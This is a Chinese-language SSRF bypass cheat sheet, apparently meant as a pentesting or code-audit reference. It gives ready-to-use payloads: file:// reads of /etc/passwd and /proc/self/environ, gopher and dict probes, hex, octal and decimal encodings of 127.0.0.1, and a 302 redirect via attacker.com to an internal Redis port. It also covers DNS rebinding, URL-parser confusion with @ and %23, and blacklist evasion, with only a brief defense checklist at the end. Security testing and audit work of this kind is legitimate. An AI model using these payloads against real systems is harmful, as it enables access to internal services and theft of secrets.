# SSRF绕过秘笈

## 协议滥用

### 非常见协议利用
```
file:///etc/passwd          # 本地文件读取
gopher://internal.ip:port   # Gopher协议（老旧服务）
dict://internal.ip:port     # Dict协议扫描
ldap://internal.ip:port     # LDAP协议
tftp://internal.ip:port     # TFTP协议
```

### file:// 协议利用
```
file:///etc/passwd          # 读取本地文件
file:///proc/self/environ   # 读取环境变量
file:///proc/net/arp        # 读取ARP表（内网IP识别）
file:///c:/windows/win.ini  # Windows文件
```

## 内网IP绕过

### IP地址表示法和解析行为理解
```
127.0.0.1                   # 标准回环地址
127.x.x.x                   # 整个地址段都是本地回环地址（127.0.0.0/8）
127.244.1.1                 # 不包含1或0的地址，可绕过某些正则过滤
0.0.0.0                     # 绑定到所有地址
localhost                   # 主机名形式
127.1                       # 简写形式（127.0.0.1）
10.1                        # 简写形式（10.0.0.1）
0                           # 单个0等于127.0.0.1（某些系统）

// 绕过原理：当正则过滤包含1或0时，127.244.1.1等地址不包含被过滤模式
// 例如：过滤127.0.0.1，但127.244.1.1不匹配该模式
```

### 私有IP范围识别
```
10.0.0.0/8                  # 10.0.0.0 - 10.255.255.255
172.16.0.0/12              # 172.16.0.0 - 172.31.255.255
192.168.0.0/16             # 192.168.0.0 - 192.168.255.255
169.254.0.0/16             # 链接本地地址
127.0.0.0/8                # 本地回环地址段
```

### 增强IP地址验证的完整性
```
// 完整的IP地址验证方法
// 1. 使用filter_var验证
filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)

// 2. 验证域名解析结果
$ip = gethostbyname($hostname);
if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE) === false) {
    // 拒绝内网IP
}

// 域名解析绕过技术：
// 当代码仅过滤IP地址格式时，通过域名解析到内网IP可以绕过过滤
// 例如：internal.local → 192.168.1.1
// 如果只检查URL中是否包含IP地址格式，域名可以绕过
```

### IP地址编码绕过
```
0x7f.0x0.0x0.0x1           # 十六进制：127.0.0.1
017700000001               # 八进制：127.0.0.1
2130706433                  # 十进制：127.0.0.1
0x7f000001                  # 完整十六进制
```

## 扩展间接绕过技术

### 302跳转绕过技术详解
```
// 在公网服务器上创建302跳转到127.0.0.1
// 步骤：
// 1. 在attacker.com上创建302跳转页面
// 2. 302 Location: http://127.0.0.1:6379/
// 3. 受害应用请求attacker.com，通过IP检查
// 4. 跟随302跳转到内网地址

// 示例：
// 请求：http://attacker.com/redirect
// 响应：302 Found
//      Location: http://127.0.0.1:6379/
// 受害应用跟随跳转，访问内网服务
```

### DNS重绑定绕过技术
```
// 利用DNS解析的时间差
// 1. 攻击者控制的域名指向攻击者服务器
// 2. 受害应用第一次DNS查询（检查）：返回攻击者IP
//    - 防护系统验证：该IP是公网，允许
// 3. 受害应用第二次DNS查询（执行）：返回内网IP
//    - 受害应用向内网IP发送请求

// 实现方法：
// - 简单的TTL=0方案
// - 使用随机子域：http://randomXXXX.attacker.com/
// - 利用DNS解析的时间窗口
```

### 间接绕过技术的研判标准
```
// 确认为漏洞的条件：
// 1. 应用跟随HTTP重定向
// 2. 应用进行DNS查询（可能多次）
// 3. 检查阶段和执行阶段的DNS解析结果可能不同

// 误报判定：
// - 应用不跟随重定向
// - DNS查询结果被缓存
// - 检查阶段和执行阶段使用相同的DNS解析结果

// 代码异味：
// - curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true)
// - 未限制重定向次数
// - 未验证重定向目标
```

## 深入HTTP协议和URL解析差异

### HTTP基本身份认证格式绕过
```
// @符号绕过正则匹配
http://user@127.0.0.1/
http://user:pass@127.0.0.1/
http://user@attacker.com:@127.0.0.1/

// 绕过原理：正则匹配URL字符串时，@符号后的host才是实际访问目标
// Python/某些库：user=attacker.com, host=127.0.0.1
// Java: 不同的解析结果
```

### URL解析库差异
```
// parse_url() vs 实际请求库的解析差异
// parse_url()可能解析为attacker.com
// 但实际请求库可能解析为127.0.0.1

http://127.0.0.1.attacker.com/
# 某些DNS库只验证前缀，导致解析到attacker.com但显示为127.0.0.1

http://127.0.0.1%23attacker.com/
# URL解码后：http://127.0.0.1#attacker.com/ (注释后面部分)
```

### 端口混淆
```
http://internal.ip:@attacker.com/
http://internal.ip:80@attacker.com/
# 某些库可能解析错误
```

## 开放重定向链

### 利用应用的开放重定向
```
1. 自身应用存在开放重定向：/redirect?url=XXX
2. 构造：fetch('/redirect?url=http://127.0.0.1:6379/')
3. 应用先请求自身重定向点，然后跟随到内网地址
```

### 信任链利用
```
合作方A允许访问 → 合作方B
构造：http://partnerA.com/callback?url=http://127.0.0.1:9200
# 应用信任partnerA，发起请求
# partnerA可能进行重定向或代理到任意地址
```

## 协议混淆和重定向

### HTTP→HTTPS重定向
```
http://attacker.com → 302重定向到 https://127.0.0.1/
# 应用跟随HTTPS重定向到内网
```

### Chunked Transfer Encoding
```
某些应用可能处理不当，导致请求被分割发送到错误的地址
```

## 绕过黑名单

### 域名黑名单
```
localhost.attacker.com      # 包含localhost但实际是attacker.com
127.0.0.1.attacker.com      # 包含IP但实际是attacker.com
google.com.attacker.com     # 看起来是google但实际域名不同
```

### 子域名滥用
```
http://sub.internal.ip/     # 如果使用.endswith()检查
http://internal.ip.attacker.com/
```

### 案例敏感性
```
HTTP://127.0.0.1/           # 某些黑名单区分大小写
HtTp://127.0.0.1/
```

## 快速定位和利用

**关键词识别**：
- curl、wget、fetch()、requests库的使用
- URL直接来自用户输入无验证
- 无黑名单或黑名单不完整
- 允许file://协议
- 跟随HTTP重定向无限制

**测试优先级**：
1. 直接内网IP（127.0.0.1、10.x.x.x）
2. DNS名称（localhost）
3. 编码形式（十六进制、八进制、十进制IP）
4. 协议滥用（file://、gopher://）
5. DNS Rebinding和开放重定向链

## 防御检查清单

- ✓ 明确的IP白名单而非黑名单
- ✓ 禁用危险协议（file://、gopher://等）
- ✓ 验证DNS查询结果（固定TTL）
- ✓ 禁用HTTP重定向跟随
- ✓ 使用dedicated HTTP客户端库的安全配置
- ✓ 分离出网和入网流量
- ✓ 定期审计所有网络请求
